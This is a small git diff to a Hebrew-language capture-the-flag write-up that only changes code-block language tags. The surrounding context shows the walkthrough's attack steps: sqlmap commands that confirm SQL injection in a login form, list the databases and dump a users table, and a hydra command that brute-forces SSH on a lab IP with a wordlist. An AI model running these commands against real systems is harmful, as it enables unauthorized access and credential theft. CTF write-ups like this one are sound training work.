@@ -105,7 +105,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
 
 לאחר שבדקנו את הבקשה של הכניסה הכלי `sqlmap` אישר את הפגיעות בלי בעיה ומצאנו את הפריצה רק נותר לנצל ולקבל את ההרשאות שלנו במסגרת ה- CTF.
 התגובה של הכלי בחזרה:
-``` json
+``` sql
 POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
 ---
@@ -135,7 +135,7 @@ available databases [3]:
 ```
  
  הוא גילה לנו את הבסיסי נתונים שנמצאים בתוך השרת וניתן לגשת אליהם בעזרת הפגיעות, נכנס לבסיס נתונים שנקרא `website` ונבדוק מה הם העמודות שנמצאות בפנים לפי הפקודה `sqlmap -r request.txt -p username -D website --tables`:
- ``` json
+ ``` sql
  sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: username (POST)
@@ -162,7 +162,7 @@ Database: website
 
 נכנס לטבלה של המשתמשים כדי לקבל שמות משתמשים וסיסמאות מבסיס הנתונים לפי הפקודה `sqlmap -r requrest222.txt -p username -D website -T users --dump`
 המשתמש שקיבלנו:
-``` json
+``` sql
 Database: website
 Table: users
 [1 entry]
@@ -186,7 +186,7 @@ Table: users
 
 הפקודה: `hydra -l hazel -P rockyou.txt ssh://10.114.181.45 -t 4 -I -f`
 הכלי בתגובה:
-``` json
+``` nse
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-30 11:09:28
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
